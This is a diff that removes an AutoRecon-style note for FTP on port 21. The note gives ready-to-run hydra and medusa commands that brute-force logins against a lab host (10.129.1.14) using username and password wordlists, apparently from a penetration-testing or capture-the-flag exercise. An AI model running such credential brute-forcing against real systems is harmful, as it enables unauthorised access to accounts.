@@ -1,8 +1,0 @@
-[*] ftp on tcp/21
-
-	[-] Bruteforce logins:
-
-		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/home/kali/Vault/Target/10.129.1.14/result/autorecon/10.129.1.14/scans/tcp21/tcp_21_ftp_hydra.txt" ftp://10.129.1.14
-
-		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/home/kali/Vault/Target/10.129.1.14/result/autorecon/10.129.1.14/scans/tcp21/tcp_21_ftp_medusa.txt" -M ftp -h 10.129.1.14
-
